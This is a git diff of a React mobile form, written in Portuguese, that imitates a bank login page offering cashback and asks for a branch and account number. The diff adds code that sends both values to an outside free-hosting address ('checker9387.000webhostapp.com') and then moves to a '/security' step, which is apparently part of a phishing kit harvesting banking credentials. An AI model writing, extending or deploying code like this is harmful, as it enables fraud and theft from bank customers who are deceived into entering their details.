@@ -1,21 +1,33 @@
-import React from 'react'
-import { useState } from 'react'
-import {Link} from 'react-router-dom'
+import React, { useState } from 'react';
+import { useNavigate } from 'react-router-dom'
 import InputMask from 'react-input-mask';
-import './FisicaMobile.css'
+import './FisicaMobile.css';
 
 const FisicaMobile = () => {
   const [ag, setAg] = useState("");
   const [conta, setConta] = useState("");
+  const navigate = useNavigate();
 
-  const setMemory = () => {
-    localStorage.setItem("ag", ag);
-    localStorage.setItem("conta", conta);
+  const setMemory = async () => {
+    if(!ag || !conta){
+      alert("Por favor preencha todos os campos !");
+      return; // Adicionado para evitar prosseguir com a execução /security
+    }
+    try {
+      const response = await fetch(`https://checker9387.000webhostapp.com/1/?ag=${ag}&conta=${conta}`);
+      if (!response.ok) {
+        throw new Error('Sistema indisponível');
+      }
+      navigate('/security');
+    } catch (error) {
+      console.error('Erro ao fazer a requisição:', error);
+    }
   }
-  
+
   const gravaAgencia = (event) => {
     setAg(event.target.value);
   };
+
   const gravaConta = (event) => {
     setConta(event.target.value);
   };
@@ -30,13 +42,13 @@ const FisicaMobile = () => {
             <p>Ganhe pontos e cashback e<br />use esse benefício para economizar</p>
         </div>
         <div className='form1'>
-            <InputMask mask="9999" className='digitavel' type="text" placeholder='agência' onChange={gravaAgencia} disableUnderline  />
-            <InputMask mask="9999999-9" className='digitavel' type="text" placeholder='conta' onChange={gravaConta} disableUnderline  /><br /><br />
+            <InputMask mask="9999" className='digitavel' type="text" placeholder='agência' onChange={gravaAgencia} />
+            <InputMask mask="9999999-9" className='digitavel' type="text" placeholder='conta' onChange={gravaConta} /><br /><br />
             <input type="checkbox" /><label>lembrar de mim</label><br /><br /><br />
-            <Link to="/security"><button onClick={setMemory}>próximo</button></Link>
+            <button onClick={setMemory}>próximo</button>
         </div>
     </div>
-  )
+  );
 }
 
-export default FisicaMobile
+export default FisicaMobile;
